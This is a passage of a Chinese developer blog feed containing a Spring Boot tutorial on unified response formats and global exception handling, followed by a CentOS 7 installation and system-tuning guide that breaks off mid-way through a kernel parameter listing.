class="hljs-title function_">getCode</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> code;    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMessage</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> msg;    &#125;&#125;language-java复制代码</code></pre><hr><h2 id="2-创建自定义异常类"><a href="#2-创建自定义异常类" class="headerlink" title="2. 创建自定义异常类"></a>2. 创建自定义异常类</h2><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo2.v1.dto.exception;<span class="hljs-keyword">import</span> com.example.demo2.v1.dto.RHttpStatusEnum;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 自定义异常类</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DiariesException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RuntimeException</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">132719492029L</span>;    <span class="hljs-keyword">private</span> RHttpStatusEnum rHttpStatusEnum;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DiariesException</span><span class="hljs-params">(RHttpStatusEnum rHttpStatusEnum)</span> &#123;        <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;errorCode：&quot;</span>+rHttpStatusEnum.getCode()+<span class="hljs-string">&quot;; errorMsg：&quot;</span>+ rHttpStatusEnum.getMessage());        <span class="hljs-built_in">this</span>.rHttpStatusEnum = rHttpStatusEnum;    &#125;    <span class="hljs-keyword">public</span> RHttpStatusEnum <span class="hljs-title function_">getrHttpStatusEnum</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> rHttpStatusEnum;    &#125;&#125;language-java复制代码</code></pre><hr><h2 id="3-创建统一返回格式类"><a href="#3-创建统一返回格式类" class="headerlink" title="3. 创建统一返回格式类"></a>3. 创建统一返回格式类</h2><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo2.v1.dto;<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;<span class="hljs-keyword">import</span> lombok.Data;<span class="hljs-keyword">import</span> lombok.NoArgsConstructor;<span class="hljs-keyword">import</span> lombok.ToString;<span class="hljs-comment">/**</span><span class="hljs-comment"> * REST API 返回结果</span><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> hjxstart</span><span class="hljs-comment"> * <span class="hljs-doctag">@since</span> 2021/8/1</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Data</span><span class="hljs-meta">@NoArgsConstructor</span><span class="hljs-meta">@AllArgsConstructor</span><span class="hljs-meta">@ToString</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">R</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 标识返回状态</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">private</span> Integer code;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 返回的成功或失败的一个消息</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">private</span>  String msg;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 返回的数据类型，为什么用Ojbect,因为在开发中返回的结构的数据类型是不确定的</span><span class="hljs-comment">     * 后续可以考虑使用：泛型来解决</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">private</span> Object data;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 自定义构造函数</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">R</span><span class="hljs-params">(Integer code, String msg)</span> &#123;        <span class="hljs-built_in">this</span>.code = code;        <span class="hljs-built_in">this</span>.msg = msg;    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 成功返回无数据</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> R <span class="hljs-title function_">ok</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">R</span>(RHttpStatusEnum.SUCCESS.getCode(), RHttpStatusEnum.SUCCESS.getMessage(), <span class="hljs-string">&quot;&quot;</span>);    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 成功返回带数据</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> R <span class="hljs-title function_">ok</span><span class="hljs-params">(Object data)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">R</span>(RHttpStatusEnum.SUCCESS.getCode(), RHttpStatusEnum.SUCCESS.getMessage(), data);    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 失败返回无数据</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> R <span class="hljs-title function_">error</span><span class="hljs-params">(RHttpStatusEnum rHttpStatusEnum)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">R</span>(rHttpStatusEnum.getCode(), rHttpStatusEnum.getMessage());    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 失败返回带数据</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> R <span class="hljs-title function_">error</span><span class="hljs-params">(RHttpStatusEnum rHttpStatusEnum, Object data)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">R</span>(rHttpStatusEnum.getCode(), rHttpStatusEnum.getMessage(), data);    &#125;&#125;language-java复制代码</code></pre><hr><h2 id="4-创建异常处理类"><a href="#4-创建异常处理类" class="headerlink" title="4. 创建异常处理类"></a>4. 创建异常处理类</h2><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo2.v1.dto;<span class="hljs-keyword">import</span> com.example.demo2.v1.dto.exception.DiariesException;<span class="hljs-keyword">import</span> org.slf4j.Logger;<span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ExceptionHandler;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestControllerAdvice;<span class="hljs-keyword">import</span> java.util.Arrays;<span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> jxh</span><span class="hljs-comment"> */</span><span class="hljs-meta">@RestControllerAdvice(&quot;com.example.demo2.v1.controller&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ControllerExceptionAdvice</span> &#123;    <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">LOG</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(ControllerExceptionAdvice.class);    <span class="hljs-meta">@ExceptionHandler(DiariesException.class)</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">exceptionHandler</span><span class="hljs-params">(DiariesException e)</span> &#123;        LOG.error(<span class="hljs-string">&quot;errorMsg：&quot;</span> + e.getMessage() + <span class="hljs-string">&quot;，errorClass: &quot;</span> + Arrays.stream(e.getStackTrace()).findFirst() + <span class="hljs-string">&quot;，errorTime: &quot;</span> + System.currentTimeMillis());        <span class="hljs-keyword">return</span> e;    &#125;    <span class="hljs-meta">@ExceptionHandler(Exception.class)</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">exceptionHandler</span><span class="hljs-params">(Exception e)</span> &#123;        LOG.error(<span class="hljs-string">&quot;&quot;</span>, e);        <span class="hljs-keyword">return</span> e;    &#125;&#125;language-java复制代码</code></pre><hr><h2 id="5-创建统一返回格式处理类"><a href="#5-创建统一返回格式处理类" class="headerlink" title="5. 创建统一返回格式处理类"></a>5. 创建统一返回格式处理类</h2><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo2.v1.dto;<span class="hljs-keyword">import</span> com.example.demo2.v1.dto.exception.DiariesException;<span class="hljs-keyword">import</span> com.example.demo2.v1.util.JsonUtil;<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<span class="hljs-keyword">import</span> org.springframework.core.MethodParameter;<span class="hljs-keyword">import</span> org.springframework.http.MediaType;<span class="hljs-keyword">import</span> org.springframework.http.converter.HttpMessageConverter;<span class="hljs-keyword">import</span> org.springframework.http.server.ServerHttpRequest;<span class="hljs-keyword">import</span> org.springframework.http.server.ServerHttpResponse;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ControllerAdvice;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.ResponseBodyAdvice;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 对返回结果处理，统一返回格式。</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Slf4j</span><span class="hljs-meta">@ControllerAdvice(basePackages = &quot;com.example.demo2.v1&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResultResponseHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ResponseBodyAdvice</span>&lt;Object&gt; &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 是否对返回结果进行处理</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> methodParameter 方法的参数</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> aClass 类</span><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> true</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(MethodParameter methodParameter, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; aClass)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">beforeBodyWrite</span><span class="hljs-params">(Object o, MethodParameter methodParameter, MediaType mediaType, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; aClass, ServerHttpRequest serverHttpRequest, ServerHttpResponse serverHttpResponse)</span> &#123;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 日报异常返回处理</span><span class="hljs-comment">         */</span>        <span class="hljs-keyword">if</span> (o <span class="hljs-keyword">instanceof</span> DiariesException) &#123;            <span class="hljs-keyword">return</span> R.error(((DiariesException) o).getrHttpStatusEnum(), <span class="hljs-string">&quot;1&quot;</span> + System.currentTimeMillis());        &#125;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 通用异常返回类型</span><span class="hljs-comment">         */</span>        <span class="hljs-keyword">if</span> (o <span class="hljs-keyword">instanceof</span> Exception) &#123;            <span class="hljs-keyword">return</span> R.error(RHttpStatusEnum.SERVER_ERROR);        &#125;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 因为如果返回是string的话默认会调用string的处理器直接返回，所以要进行处理</span><span class="hljs-comment">         */</span>        <span class="hljs-keyword">if</span> (o <span class="hljs-keyword">instanceof</span> String) &#123;            <span class="hljs-keyword">return</span> JsonUtil.obj2String(R.ok(o));        &#125;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 正常返回</span><span class="hljs-comment">         */</span>        <span class="hljs-keyword">return</span> R.ok(o);    &#125;&#125;language-java复制代码</code></pre><hr><h1 id="1-统一返回格式"><a href="#1-统一返回格式" class="headerlink" title="1. 统一返回格式"></a>1. 统一返回格式</h1><ol><li>定义枚举类型</li></ol><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">RHttpStatusEnum</span> &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 成功</span><span class="hljs-comment">     */</span>    SUCCESS(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;success&quot;</span>),    ERROR(-<span class="hljs-number">1</span>, <span class="hljs-string">&quot;error&quot;</span>);    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> code;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String message;    RHttpStatusEnum(Integer code, String message) &#123;        <span class="hljs-built_in">this</span>.code = code;        <span class="hljs-built_in">this</span>.message = message;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> code;    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMessage</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> message;    &#125;&#125;language-java复制代码</code></pre><ol><li>定义 dto</li></ol><pre><code class="hljs java"><span class="hljs-meta">@Data</span><span class="hljs-meta">@NoArgsConstructor</span><span class="hljs-meta">@AllArgsConstructor</span><span class="hljs-meta">@ToString</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">R</span>&#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 标识返回状态</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">private</span> Integer code;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 返回的成功或失败的一个消息</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">private</span>  String message;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 返回的数据类型，为什么用Ojbect,因为在开发中返回的结构的数据类型是不确定的</span><span class="hljs-comment">     * 后续可以考虑使用：泛型来解决</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">private</span> Object data;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 成功返回无数据</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> R <span class="hljs-title function_">ok</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">R</span>(RHttpStatusEnum.SUCCESS.getCode(), RHttpStatusEnum.SUCCESS.getMessage(), <span class="hljs-string">&quot;&quot;</span>);    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 成功返回带数据</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> R <span class="hljs-title function_">ok</span><span class="hljs-params">(Object data)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">R</span>(RHttpStatusEnum.SUCCESS.getCode(), RHttpStatusEnum.SUCCESS.getMessage(), data);    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 失败返回</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> R <span class="hljs-title function_">error</span><span class="hljs-params">(RHttpStatusEnum rHttpStatusEnum,Integer code)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">R</span>(rHttpStatusEnum.getCode(), rHttpStatusEnum.getMessage(), <span class="hljs-string">&quot;&quot;</span>);    &#125;&#125;language-java复制代码</code></pre><ol><li>定义全局处理</li></ol><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * 对返回结果处理，统一返回格式。</span><span class="hljs-comment"> */</span><span class="hljs-meta">@ControllerAdvice(basePackages = &quot;com.fh.java.internalsystemjava&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResultResponseHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ResponseBodyAdvice</span>&lt;Object&gt; &#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 是否支持advice功能， true 是支持 false是不支持</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> methodParameter</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> aClass</span><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(MethodParameter methodParameter, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; aClass)</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     *</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> o controller方法的返回值</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> methodParameter</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> mediaType</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> aClass</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> serverHttpRequest</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> serverHttpResponse</span><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">beforeBodyWrite</span><span class="hljs-params">(Object o, MethodParameter methodParameter, MediaType mediaType, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; aClass, ServerHttpRequest serverHttpRequest, ServerHttpResponse serverHttpResponse)</span> &#123;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 因为如果返回是string的话默认会调用string的处理器直接返回，所以要进行处理</span><span class="hljs-comment">         */</span>        <span class="hljs-keyword">if</span> (o <span class="hljs-keyword">instanceof</span> String) &#123;            <span class="hljs-keyword">return</span> JsonUtil.obj2String(R.ok(o));        &#125;        <span class="hljs-keyword">return</span> R.ok(o);    &#125;&#125;language-java复制代码</code></pre><ol><li>只要在controller返回正常的数据即可。全局处理会自动加上code和messgae.</li></ol><hr><h2 id="2-全局异常处理"><a href="#2-全局异常处理" class="headerlink" title="2. 全局异常处理"></a>2. 全局异常处理</h2><hr>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7</title>
      <link href="/2021/06/07/CentOS7/"/>
      <url>/2021/06/07/CentOS7/</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h2><h3 id="1-分区"><a href="#1-分区" class="headerlink" title="1.分区"></a>1.分区</h3><p>&#x2F;blos boot 2M<br>&#x2F;boot 1G<br>&#x2F; 10G 修改为固定<br>&#x2F;home 5G<br>swap 1G</p><h2 id="最小安装配置"><a href="#最小安装配置" class="headerlink" title="最小安装配置"></a>最小安装配置</h2><h3 id="1-安装-net-tools"><a href="#1-安装-net-tools" class="headerlink" title="1.安装 net-tools"></a>1.安装 net-tools</h3><pre><code class="hljs shell">yum install net-toolsyyifconfiglanguage-shell复制代码</code></pre><h3 id="2-安装-openssh、openssl-并启动"><a href="#2-安装-openssh、openssl-并启动" class="headerlink" title="2.安装 openssh、openssl 并启动"></a>2.安装 openssh、openssl 并启动</h3><pre><code class="hljs shell">yum install openssh*yyum -y install openssl openssl-devel patchsystemctl start sshdlanguage-shell复制代码</code></pre><h3 id="3-安装-vim"><a href="#3-安装-vim" class="headerlink" title="3.安装 vim"></a>3.安装 vim</h3><pre><code class="hljs shell">yum -y install vimlanguage-shell复制代码</code></pre><h3 id="4-安装-wget"><a href="#4-安装-wget" class="headerlink" title="4.安装 wget"></a>4.安装 wget</h3><pre><code class="hljs shell">yum -y install wgetlanguage-shell复制代码</code></pre><h3 id="5-安装-gcc-编译套件"><a href="#5-安装-gcc-编译套件" class="headerlink" title="5.安装 gcc 编译套件"></a>5.安装 gcc 编译套件</h3><pre><code class="hljs shell">yum install gccylanguage-shell复制代码</code></pre><h2 id="系统优化"><a href="#系统优化" class="headerlink" title="系统优化"></a>系统优化</h2><h3 id="1-关闭-selinux"><a href="#1-关闭-selinux" class="headerlink" title="1.关闭 selinux"></a>1.关闭 selinux</h3><pre><code class="hljs bash">sed -i <span class="hljs-string">&#x27;s/=enforcing/=disabled/&#x27;</span> /etc/selinux/configsetenforce 0</code></pre><hr><h3 id="2-更改为阿里-yum-源"><a href="#2-更改为阿里-yum-源" class="headerlink" title="2.更改为阿里 yum 源"></a>2.更改为阿里 yum 源</h3><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backupwget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repoyum makecache</code></pre><hr><h3 id="3-优化-ssh-远程登录配置"><a href="#3-优化-ssh-远程登录配置" class="headerlink" title="3.优化 ssh 远程登录配置"></a>3.优化 ssh 远程登录配置</h3><pre><code class="hljs bash"><span class="hljs-comment">#备份/etc/ssh/sshd_conf</span><span class="hljs-built_in">cp</span> /etc/ssh/sshd_config&#123;,.`<span class="hljs-built_in">date</span> +%F`.bak&#125;<span class="hljs-comment">#不允许基于GSSAPI的用户认证</span>sed -i <span class="hljs-string">&#x27;s/^GSSAPIAuthentication yes$/GSSAPIAuthentication no/&#x27;</span> /etc/ssh/sshd_config<span class="hljs-comment"># 不允许sshd对远程主机名进行反向解析</span>sed -i <span class="hljs-string">&#x27;s/#UseDNS yes/UseDNS no/&#x27;</span> /etc/ssh/sshd_configsystemctl restart sshd</code></pre><h3 id="4-历史记录数及登录超时环境变量设置"><a href="#4-历史记录数及登录超时环境变量设置" class="headerlink" title="4.历史记录数及登录超时环境变量设置"></a>4.历史记录数及登录超时环境变量设置</h3><pre><code class="hljs bash"><span class="hljs-comment"># 设置闲置超时时间为300s</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;export TMOUT=300&#x27;</span> &gt;&gt;/etc/profile<span class="hljs-comment"># 设置历史记录文件的命令数量为100</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;export HISTFILESIZE=100&#x27;</span> &gt;&gt;/etc/profile<span class="hljs-comment"># 设置命令行的历史记录数量</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;export HISTSIZE=100&#x27;</span> &gt;&gt;/etc/profile<span class="hljs-comment"># 格式化输出历史记录(以年月日分时秒的格式输出)</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;export HISTTIMEFORMAT=&quot;%Y-%m-%d %H:%M:%S&quot;&#x27;</span> &gt;&gt;/etc/profile<span class="hljs-built_in">source</span> /etc/profile<span class="hljs-built_in">tail</span> -4 /etc/profile</code></pre><hr><h3 id="5-调整-linux-描述符"><a href="#5-调整-linux-描述符" class="headerlink" title="5.调整 linux 描述符"></a>5.调整 linux 描述符</h3><pre><code class="hljs bash"><span class="hljs-comment">#文件描述符是由无符号整数表示的句柄,进程使用它来标识打开的文件.文件描述符与包括相关信息(如文件的打开模式,文件的位置类型,文件的初始类型等)的文件对象相关联,这些信息被称作文件的上下文.文件描述符的有效范围是0到OPEN_MAX.</span><span class="hljs-comment">#对于内核而言,所有打开的文件都是通过文件的描述符引用的.当打开一个现有文件或创建一个新文件时,内核向进程返回一个文件描述符,当读或写一个文件时,使用open或create返回的文件描述符标识该文件,并将其作为参数传递给read或write.</span><span class="hljs-comment"># 查看系统文件描述符设置的情况可以使用下面的命令,文件描述符大小默认是1024.</span><span class="hljs-built_in">ulimit</span> -n<span class="hljs-comment"># 对于高并发的业务Linux服务器来说,这个默认的设置值是不够的,需要调整.</span><span class="hljs-comment"># 调整方法一:</span><span class="hljs-comment"># 调整系统文件描述符为65535</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;*        -    nofile    65535&#x27;</span> &gt;&gt;/etc/security/limits.conf<span class="hljs-built_in">tail</span> -l /etc/security/limits.conf<span class="hljs-comment"># 调整方法二:</span><span class="hljs-comment"># 直接把ulimit -SHn 65535命令加入/etc/rc.d/rc.local,用以设置每次开机启动时配置生效,命令如下:</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; ulimit -HSn 65535&quot;</span> &gt;&gt;/etc/rc.d/rc.local<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; ulimit -s 65535&quot;</span> &gt;&gt;/etc/rc.d/rc.local</code></pre><hr><h3 id="6-定时清理邮件服务临时目录垃圾文件"><a href="#6-定时清理邮件服务临时目录垃圾文件" class="headerlink" title="6.定时清理邮件服务临时目录垃圾文件"></a>6.定时清理邮件服务临时目录垃圾文件</h3><pre><code class="hljs bash"><span class="hljs-comment"># centos7默认是安装了Postfix邮件服务的,因此邮件临时存放地点的路径为/var/spool/postfix/maildrop,为了防止目录被垃圾文件填满,导致系统额inode数量不够用,需要定期清理.</span><span class="hljs-comment"># 定时清理的方法为:将清理命令写成脚本,然后做成定时任务,每日凌晨0点执行一次.</span><span class="hljs-comment"># 创建存放脚本的目录</span>[ -d /server/scripts/shell ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;directory already exists.&quot;</span> || <span class="hljs-built_in">mkdir</span> /server/scripts/shell -p<span class="hljs-comment"># 编写脚本文件</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;find /var/spool/postfix/maildrop/ -type f|xargs rm -f&#x27;</span> &gt;/server/scripts/shell/del_mail_file.sh<span class="hljs-comment"># 查看</span><span class="hljs-built_in">cat</span> /server/scripts/shell/del_mail_file.sh<span class="hljs-comment"># 加入计划任务</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;00 00 * * * /bin/bash /server/scripts/shell/del_mail_file.sh &gt;/dev/null &amp;1&quot;</span> &gt;&gt;/var/spool/cron/rootcrontab -l</code></pre><hr><h3 id="7-内核优化"><a href="#7-内核优化" class="headerlink" title="7.内核优化"></a>7.内核优化</h3><p>Linux 服务器内核参数优化,主要是指在 Linux 系统中针对业务服务应用而进行的系统内核参数调整,优化并无一定的标准.下面是生产环境下 Linux 常见的内核优化:</p><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &gt;&gt;/etc/sysctl.conf&lt;&lt;<span class="hljs-string">EOF</span><span class="hljs-string">#kernel_flag</span><span class="hljs-string">#关闭ipv6</span><span class="hljs-string">net.ipv6.conf.all.disable_ipv6 = 1</span><span class="hljs-string">net.ipv6.conf.default.disable_ipv6 = 1</span><span class="hljs-string"># 避免放大攻击</span><span class="hljs-string">net.ipv4.icmp_echo_ignore_broadcasts = 1</span><span class="hljs-string"># 开启恶意icmp错误消息保护</span><span class="hljs-string">net.ipv4.icmp_ignore_bogus_error_responses = 1</span><span class="hljs-string">#关闭路由转发</span><span class="hljs-string">#net.ipv4.ip_forward = 0</span><span class="hljs-string">#net.ipv4.conf.all.send_redirects = 0</span><span class="hljs-string">#net.ipv4.conf.default.send_redirects = 0</span><span class="hljs-string">#开启反向路径过滤</span><span class="hljs-string">net.ipv4.conf.all.rp_filter = 1</span><span class="hljs-string">net.ipv4.conf.default.rp_filter = 1</span><span class="hljs-string">#处理无源路由的包</span><span class="hljs-string">net.ipv4.conf.all.accept_source_route = 0</span><span class="hljs-string">net.ipv4.conf.default.accept_source_route = 0</span><span class="hljs-string">#关闭sysrq功能</span><span class="hljs-string">kernel.sysrq = 0</span><span class="hljs-string">#core文件名中添加pid作为扩展名</span><span class="hljs-string">kernel.core_uses_pid = 1</span><span class="hljs-string"># 开启SYN洪水攻击保护</span><span class="hljs-string">net.ipv4.tcp_syncookies = 1</span><span class="hljs-string">#修改消息队列长度</span><span class="hljs-string">kernel.msgmnb = 65536</span><span class="hljs-string">kernel.msgmax = 65536</span><span class="hljs-string">#设置最大内存共享段大小bytes</span><span class="hljs-string">kernel.shmmax = 68719476736</span><span class="hljs-string">kernel.shmall = 4294967296</span><span class="hljs-string">#timewait的数量，默认180000</span><span class="hljs-string">net.ipv4.tcp_max_tw_buckets = 6000</span><span class="hljs-string">net.ipv4.tcp_sack = 1</span><span class="hljs-string">net.ipv4.tcp_window_scaling = 1</span><span class="hljs-string">net.ipv4.tcp_rmem = 4096        87380   4194304</span><span class="hljs-string">net.ipv4.tcp_wmem = 4096        16384   4194304</span><span class="hljs-string">net.core.wmem_default = 8388608</span><span class="hljs-string">net.core.rmem_default = 8388608</span><span class="hljs-string">net.core.rmem_max = 16777216</span><span class="hljs-string">net.core.wmem_max = 16777216</span><span class="hljs-string">#每个网络接口接收数据包的速率比内核处理这些包的速率快时，允许送到队列的数据包的最大数目</span><span class="hljs-string">net.core.netdev_max_backlog = 262144</span><span class="hljs-string">#限制仅仅是为了防止简单的DoS 攻击</span><span class="hljs-string">net.ipv4.tcp_max_orphans = 3276800</span><span class="hljs-string">#未收到客户端确认信息的连接请求的最大值</span><span class="hljs-string">net.ipv4.tcp_max_syn_backlog = 262144</span><span class="hljs-string">net.ipv4.tcp_timestamps = 0</span><span class="hljs-string">#内核放弃建立连接之前发送SYNACK 包的数量</span><span class="hljs-string">net.ipv4.tcp_synack_retries = 1</span><span class="hljs-string">#内核放弃建立连接之前发送SYN 包的数量</span><span class="hljs-string">net.ipv4.tcp_syn_retries = 1</span><span class="hljs-string">#启用timewait 快速回收</span><span class="hljs-string">net.ipv4.tcp_tw_recycle = 1</span><span class="hljs-string">#开启重用。允许将TIME-WAIT sockets 重新用于新的TCP 连接</span><span class="hljs-string">net.ipv4.tcp_tw_reuse = 1</span><span class="hljs-string">net.ipv4.tcp_mem = 94500000 915000000 927000000</span><span class="hljs-string">net.ipv4.tcp_fin_timeout = 1</span><span class="hljs-string">#当keepalive 起用的时候，TCP 发送keepalive 消息的频度。缺省是2 小时</span><span class="hljs-string">net.ipv4.tcp_keepalive_time = 30</span><span class="hljs-string">#允许系统打开的端口范围</span><span class="hljs-string">net.ipv4.ip_local_port_range = 1024    65000</span><span class="hljs-string">#修改防火墙表大小，默认65536</span><span 